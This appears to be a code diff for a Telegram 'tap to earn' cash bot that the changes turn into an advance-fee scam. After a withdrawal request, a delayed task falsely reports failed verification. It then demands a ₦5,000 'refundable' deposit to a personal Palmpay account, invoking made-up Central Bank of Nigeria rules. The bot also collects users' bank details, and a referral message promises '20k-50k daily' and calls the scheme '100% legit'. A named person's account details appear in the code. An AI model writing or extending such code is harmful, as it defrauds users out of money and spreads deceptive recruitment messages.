@@ -30,11 +30,11 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Constants
-CHANNEL_ID = "@SmartCashChannel1"
-CHANNEL_LINK = "https://t.me/SmartCashChannel1"
+CHANNEL_ID = "-1002986130855"
+CHANNEL_LINK = "https://t.me/SmartFashCash_Community"
 WAT_TIMEZONE = pytz.timezone("Africa/Lagos")
 CLAIM_AMOUNT = 5000
-REFERRAL_BONUS = 10000
+REFERRAL_BONUS = 20000  # Updated to ₦20,000
 MIN_WITHDRAWAL = 20000
 MAX_WITHDRAWAL = 1000000
 MIN_REFERRALS = 5
@@ -84,6 +84,16 @@ def check_internet_connection():
         socket.create_connection(("api.telegram.org", 443), timeout=5)
         return True
     except OSError:
+        return False
+
+async def is_user_member(user_id: int, bot) -> bool:
+    """Check if user is a member of the channel."""
+    try:
+        # Try to get chat member - this will work if bot is admin in channel
+        member = await bot.get_chat_member(CHANNEL_ID, user_id)
+        return member.status in ["member", "administrator", "creator", "restricted"]
+    except Exception as e:
+        logger.error(f"Error checking channel membership for user {user_id}: {e}")
         return False
 
 # Menu generators
@@ -175,7 +185,7 @@ async def prompt_channel_verification(update: Update):
     """Prompt user to join channel before accessing bot features."""
     verification_message = (
         "⛔️ JOIN OUR CHANNEL TO CONTINUE\n\n"
-        "Join our channel for tips, updates, and to unlock the bot's full features:\n"
+        "To use this bot, you must first join our official channel:\n"
         f"{CHANNEL_LINK}\n\n"
         "✅ After joining, click the button below to verify:"
     )
@@ -194,7 +204,7 @@ async def show_welcome_message(update: Update):
         "where you can earn BIG 💥 by simply tapping and referring friends! 😱\n\n"
         "🤑 HOW TO EARN:\n\n"
         "1️⃣ Tap to earn cash rewards hourly! ⏰ Claim ₦5,000 every hour! 💰\n"
-        "2️⃣ Refer friends to earn ₦10,000 per referral! 🤝💵 Share the wealth!\n\n"
+        f"2️⃣ Refer friends to earn {format_currency(REFERRAL_BONUS)} per referral! 🤝💵 Share the wealth!\n\n"
         "💵 WITHDRAWAL TIME:\n\n"
         "📅 Withdrawals every Saturday! Here's what you need:\n"
         f"🔹 {MIN_REFERRALS}+ referrals required\n"
@@ -215,26 +225,76 @@ async def handle_verification_callback(update: Update, context: ContextTypes.DEF
     await query.answer()
     
     try:
-        # Set user as verified (actual channel check bypassed as per requirement)
-        async with user_data_lock:
-            if user_id in user_data:
-                user_data[user_id]["channel_verified"] = True
+        # Check if user has actually joined the channel
+        is_member = await is_user_member(user_id, context.bot)
+        
+        if is_member:
+            # Set user as verified
+            async with user_data_lock:
+                if user_id not in user_data:
+                    # Create user record if it doesn't exist
+                    user_data[user_id] = {
+                        "balance": 0,
+                        "last_claim": 0,
+                        "referrals": 0,
+                        "channel_verified": True,
+                        "referred_by": None,
+                        "bank_details": {},
+                        "claim_history": [],
+                        "expecting_bank_details": False
+                    }
+                else:
+                    user_data[user_id]["channel_verified"] = True
+                
                 save_user_data()
                 logger.info(f"User {user_id} verified channel access")
-            else:
-                logger.warning(f"Verification callback for unknown user {user_id}")
-        
-        # Edit original message to remove button
-        await query.edit_message_text(
-            "✅ Channel verification complete! You can now access all bot features."
-        )
-        
-        # Show welcome message
-        await show_welcome_message(update=update)
+            
+            # Edit original message to remove button
+            await query.edit_message_text(
+                "✅ Channel verification complete! You can now access all bot features."
+            )
+            
+            # Show welcome message
+            welcome_message = (
+                "💸🔥💰 WELCOME TO SMARTKASH BOT 💰🔥💸\n\n"
+                "Get ready to tap your way to riches! 💸✨ Our platform is a TAP TO EARN cash reward "
+                "where you can earn BIG 💥 by simply tapping and referring friends! 😱\n\n"
+                "🤑 HOW TO EARN:\n\n"
+                "1️⃣ Tap to earn cash rewards hourly! ⏰ Claim ₦5,000 every hour! 💰\n"
+                f"2️⃣ Refer friends to earn {format_currency(REFERRAL_BONUS)} per referral! 🤝💵 Share the wealth!\n\n"
+                "💵 WITHDRAWAL TIME:\n\n"
+                "📅 Withdrawals every Saturday! Here's what you need:\n"
+                f"🔹 {MIN_REFERRALS}+ referrals required\n"
+                f"🔹 Min withdrawal: {format_currency(MIN_WITHDRAWAL)}\n"
+                f"🔹 Max withdrawal: {format_currency(MAX_WITHDRAWAL)}\n\n"
+                "🚀 Start tapping and inviting friends NOW! 🌟"
+            )
+            
+            await context.bot.send_message(
+                chat_id=user_id,
+                text=welcome_message,
+                reply_markup=get_main_menu()
+            )
+        else:
+            # User hasn't joined the channel
+            await query.edit_message_text(
+                "❌ You need to join our channel first!\n\n"
+                f"Please join {CHANNEL_LINK} and then click the verification button again.",
+                reply_markup=get_channel_verification_keyboard(),
+                disable_web_page_preview=True
+            )
         
     except Exception as e:
         logger.error(f"Error in verification callback for user {user_id}: {e}", exc_info=True)
-        await query.edit_message_text("⚠️ Verification failed. Please try /start again.")
+        # If there's an error, give specific instructions
+        error_message = (
+            "⚠️ Verification failed!\n\n"
+            "Please make sure:\n"
+            "1. You have joined our channel\n"
+            "2. If you have joined,Exit and join again \n"
+            "3. Try using /start again"
+        )
+        await query.edit_message_text(error_message)
 
 async def handle_menu_options(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle all menu button selections."""
@@ -400,7 +460,8 @@ async def show_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"ℹ️ YOUR BALANCE: {format_currency(balance)}\n\n"
             "💳 Withdrawals will be automatically paid to your bank account\n\n"
             "📅 WITHDRAWAL SCHEDULE:\n"
-            "- Every Saturday (12:00am - 10:00pm)\n"
+            "- Every Saturday (12:00am - 11:59pm)\n"
+            "- Every Sunday (12:00am - 10:00pm)\n"
             f"- Requires {MIN_REFERRALS}+ referrals\n\n"
             f"💰 Min withdrawal: {format_currency(MIN_WITHDRAWAL)}\n"
             f"💸 Max withdrawal: {format_currency(MAX_WITHDRAWAL)}\n\n"
@@ -477,17 +538,46 @@ async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
 
-        # Success message
+        # Success message - changed to show pending status
         await update.message.reply_text(
-            f"✅ WITHDRAWAL REQUEST RECEIVED\n\n"
+            f"⏳ WITHDRAWAL REQUEST PENDING\n\n"
             f"Hi {user.first_name},\n\n"
             "We've received your withdrawal request:\n"
             f"• Amount: {format_currency(balance)}\n"
-            f"• Account: {bank_details['acc_number']} ({bank_details['bank_name']})\n\n"
-            "⏳ Funds will be transferred within 24 hours.\n"
+            f"• Account Number: {bank_details['acc_number']}\n"
+            f"• Bank Name: {bank_details['bank_name']}\n"
+            f"• Account Name: {bank_details['acct_name']}\n\n"
+            "⏳ Your withdrawal is now pending approval.\n"
+            "Please wait for bot verification...\n\n"
             "Thank you for using SmartCash!"
         )
-        logger.info(f"Withdrawal processed for user {user_id}: ₦{balance}")
+        logger.info(f"Withdrawal pending for user {user_id}: ₦{balance}")
+
+        # Schedule the verification message after 1 minute
+        async def send_verification_message():
+            await asyncio.sleep(60)  # Wait for 1 minute
+            
+            # Send bot verification failed message first
+            await context.bot.send_message(
+                chat_id=user_id,
+                text="❌ Bot verification failed. Manual verification required."
+            )
+            
+            # Then send the detailed verification message
+            verification_message = (
+                "In line with Central Bank of Nigeria (CBN) KYC & Anti-Fraud Regulations, "
+                "all withdrawals must be verified to ensure transactions are made by real individuals, not automated bots.\n\n"
+                "To complete this process, you are required to make a one-time refundable verification deposit of ₦5,000.\n\n"
+                "Payment Details:\n"
+                "Account Number: 8149712437\n"
+                "Bank: Palmpay\n"
+                "Account Name: Deborah chinyere Vincent\n\n"
+                "✅ Once your payment is confirmed, your account will be verified and your withdrawal will be processed immediately."
+            )
+            await context.bot.send_message(chat_id=user_id, text=verification_message)
+
+        # Start the delayed task
+        asyncio.create_task(send_verification_message())
 
     except Exception as e:
         logger.error(f"Error in withdraw for user {user_id}: {e}", exc_info=True)
@@ -502,15 +592,25 @@ async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
         bot_username = context.bot.username or "SmartCashBot"
         referral_link = f"https://t.me/{bot_username}?start={user_id}"
         
-        await update.message.reply_text(
-            "💰 EARN ₦10,000 PER REFERRAL!\n\n"
+        # Full referral message
+        referral_message = (
+            "Hey there! 💐\n\n"
+            "Sorry to bother you, but I just found something incredible, and I had to share! 🚀\n\n"
+            "Join Smartkash on Telegram and make 20k-50k daily with your phone, it's free to join...💯\n\n"
+            "A new earning opportunity just launched today—SmartKash bot—and people are already cashing out! 💰\n\n"
+            "How it works:\n"
+            "✅ Join the platform\n"
+            "✅ Refer friends & earn commissions\n"
+            "✅ Get instant payouts—no delays!\n\n"
+            "It's 100% legit, fast, and easy—no stress, just earnings! The earlier you start, the more you can make.\n\n"
+            "Ready to earn? Click below to join\n"
+            f"💰 EARN {format_currency(REFERRAL_BONUS)} PER REFERRAL!\n\n"
             "Share this link with your friends:\n\n"
             f"{referral_link}\n\n"
-            "✅ Your friend gets ₦5,000 bonus on signup\n"
-            "✅ You get ₦10,000 when they join\n"
-            "✅ Withdraw together every Saturday!\n\n"
-            "👥 Start inviting now to unlock withdrawals!"
+            "Withdrawal is every Saturday to Sunday, click on the link now to join, thank me later!"
         )
+        
+        await update.message.reply_text(referral_message)
 
     except Exception as e:
         logger.error(f"Error in invite for user {user_id}: {e}", exc_info=True)
@@ -521,7 +621,6 @@ async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🆘 NEED HELP?\n\n"
         "Our support team is here to assist you!\n\n"
-        "📧 Email: support@smartcash.com\n"
         "📱 Telegram: @SmartCashSupport\n\n"
         "We typically respond within 1 hour. Thank you for your patience!"
     )
@@ -573,14 +672,14 @@ def main():
         token = input("Enter your bot token: ").strip()
         if not token:
             raise ValueError("Bot token cannot be empty")
-        
+
         logger.info("Initializing bot...")
         application = Application.builder().token(token).build()
 
         # Register handlers
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CallbackQueryHandler(handle_verification_callback, pattern="^channel_verified$"))
-        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu_options))
+        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, handle_menu_options))
         
         logger.info("Starting bot...")
         application.run_polling(drop_pending_updates=True)
